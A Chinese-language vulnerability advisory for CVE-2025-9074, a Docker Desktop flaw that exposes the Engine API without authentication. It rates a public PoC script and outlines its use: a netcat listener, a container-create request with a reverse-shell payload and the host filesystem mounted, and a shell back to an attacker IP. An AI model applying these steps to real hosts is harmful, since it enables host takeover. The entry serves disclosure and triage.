## CVE-2025-9074 - Docker Desktop 未授权API访问/容器逃逸/本地权限提升 (Unauthenticated API Access/Container Escape/LPE)

**漏洞编号:** CVE-2025-9074

**漏洞类型:** 未授权API访问/容器逃逸/本地权限提升 (Unauthenticated API Access/Container Escape/LPE)

**影响应用:** Docker Desktop

**危害等级:** 高危/严重 (Critical)

**CVSS评分:** 9.3

**影响版本:** 4.44.3之前的版本 (Versions prior to 4.44.3)

**利用条件:** 无需认证，Docker Engine HTTP API暴露在本地网络接口上 (No authentication required, Docker Engine HTTP API exposed on local network interface)

**POC 可用性:** 9/10

**POC 类型:** 完整利用 (Full Exploit)

**攻击复杂度:** 低 (Low)

**投毒风险:** 5%

## 详情

POC有效性分析: 提供的`CVE-2025-9074.sh`脚本是一个完整且高度有效的概念验证（PoC），它成功利用了Docker Desktop中未经授权的Docker Engine HTTP API暴露漏洞。通过发送精心构造的API请求，该脚本能够创建恶意容器并实现容器逃逸及本地权限提升（LPE）。脚本核心功能包括：获取现有Docker镜像、构造包含反向Shell载荷的JSON请求，并将宿主机的关键目录（如`/`和Windows的`C:`盘）挂载到新容器内。一旦容器启动，反向Shell即被执行，赋予攻击者对宿主机的任意命令执行权限。该PoC的清晰逻辑、最小依赖（`curl`和`bash`），以及直接的攻击路径，充分验证了CVE-2025-9074的严重性及其对宿主机安全造成的直接威胁。

利用步骤:
1. **环境准备**: 确保目标Docker Desktop的API（如`http://192.168.65.7:2375`）已暴露且未经认证。攻击者机器启动`nc -lvnp <LPORT>`监听。
2. **执行脚本**: 运行`sh CVE-2025-9074.sh <Docker_IP> <Docker_Port> <Attacker_IP> <Attacker_Port>`。
3. **API查询**: 脚本首先查询`/images/json`获取一个镜像ID。
4. **创建恶意容器**: 脚本向`/containers/create`发送包含反向Shell命令及宿主机目录挂载配置的JSON数据。
5. **启动容器**: 脚本向`/containers/${ID}/start`发送请求启动容器。
6. **获取Shell**: 成功后，反向Shell将连接回攻击者监听器，获得宿主机权限。

投毒风险分析: `CVE-2025-9074.sh`代码投毒风险极低（约5%）。脚本纯粹使用标准Shell和`curl`命令，逻辑透明，无代码混淆或外部恶意调用。其反向Shell载荷和宿主机目录挂载是漏洞利用的必要组成部分，而非PoC自身携带恶意代码。代码意图明确，易于审计，使用者因PoC自身而受到的意外危害风险微乎其微。

**项目地址:** https://www.sogou.com//link?url=hedJjaC291MuovqUW6cN1riit6wsUB18fD4FLWYv-iFfOynzpDp5XQ..

**漏洞详情:** https://www.sogou.com//link?url=hedJjaC291PZd-CrGDg9eqaVrGkVzd6wqijgiLPajFoY02jURvRlCN9hDpIUIyBR
